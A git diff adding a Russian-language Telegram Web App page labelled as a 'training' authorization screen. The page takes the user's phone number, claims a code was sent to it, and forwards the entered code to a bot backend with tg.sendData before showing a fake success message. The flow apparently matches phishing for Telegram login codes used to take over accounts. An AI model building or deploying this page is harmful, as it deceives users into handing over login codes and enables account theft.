@@ -1,12 +1,135 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Тест</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Учебная Авторизация</title>
+    <!-- Подключаем скрипт Telegram -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            min-height: 90vh;
+            box-sizing: border-box;
+        }
+        .hidden { display: none !important; }
+        button {
+            background-color: var(--tg-theme-button-color, #3390ec);
+            color: var(--tg-theme-button-text-color, #ffffff);
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            border-radius: 10px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 20px;
+            font-weight: 600;
+            box-sizing: border-box;
+        }
+        button:active { opacity: 0.8; }
+        input {
+            width: 100%;
+            padding: 16px;
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 8px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            margin-top: 20px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .icon { font-size: 60px; margin-bottom: 10px; }
+        h2 { margin: 10px 0; font-size: 24px; }
+        p { color: var(--tg-theme-hint-color, #707579); font-size: 15px; line-height: 1.4; }
+    </style>
 </head>
-<body style="background-color: #ffffff !important; color: #000000 !important;">
-    <h1 style="color: red; text-align: center; margin-top: 50px;">РАБОТАЕТ!</h1>
-    <p style="text-align: center; font-size: 20px;">Если ты это видишь, значит GitHub и Telegram дружат.</p>
+<body>
+
+    <!-- Экран 1: Запрос номера -->
+    <div id="screen-phone">
+        <div class="icon">📱</div>
+        <h2>Добро пожаловать!</h2>
+        <p>Для продолжения поделитесь своим номером телефона.</p>
+        <button id="share-phone-btn">Поделиться номером</button>
+    </div>
+
+    <!-- Экран 2: Ввод кода -->
+    <div id="screen-code" class="hidden">
+        <div class="icon">✉️</div>
+        <h2>Введите код</h2>
+        <p>Мы отправили код на ваш номер:<br><b id="user-phone"></b></p>
+        <input type="number" id="code-input" placeholder="00000">
+        <button id="submit-code-btn">Подтвердить</button>
+    </div>
+
+    <!-- Экран 3: Успех -->
+    <div id="screen-success" class="hidden">
+        <div class="icon">🎉</div>
+        <h2>Успешно!</h2>
+        <p>Вы успешно авторизовались.</p>
+    </div>
+
+    <script>
+        window.onload = function() {
+            if (window.Telegram && window.Telegram.WebApp) {
+                const tg = window.Telegram.WebApp;
+                tg.expand();
+
+                const phoneScreen = document.getElementById('screen-phone');
+                const codeScreen = document.getElementById('screen-code');
+                const successScreen = document.getElementById('screen-success');
+                const userPhoneText = document.getElementById('user-phone');
+
+                // 1. Кнопка "Поделиться номером"
+                document.getElementById('share-phone-btn').addEventListener('click', function() {
+                    tg.requestContact(function(shared, contact) {
+                        if (shared) {
+                            userPhoneText.innerText = "+" + contact.phone_number;
+                            phoneScreen.classList.add('hidden');
+                            codeScreen.classList.remove('hidden');
+                        }
+                    });
+                });
+
+                // 2. Кнопка "Подтвердить"
+                document.getElementById('submit-code-btn').addEventListener('click', function() {
+                    const code = document.getElementById('code-input').value;
+                    
+                    if (code.length < 4) {
+                        tg.showAlert("Введите корректный код (минимум 4 цифры)!");
+                        return;
+                    }
+
+                    // --- ТЕСТОВОЕ ОКНО ---
+                    alert("Кнопка нажата! Отправляю код: " + code);
+                    // ---------------------
+
+                    try {
+                        tg.sendData(JSON.stringify({
+                            action: "login",
+                            code: code
+                        }));
+                        
+                        // Если отправка прошла успешно
+                        codeScreen.classList.add('hidden');
+                        successScreen.classList.remove('hidden');
+                        
+                        setTimeout(function() { tg.close(); }, 2000);
+                    } catch (error) {
+                        alert("Ошибка при отправке: " + error.message);
+                    }
+                });
+            }
+        };
+    </script>
 </body>
 </html>
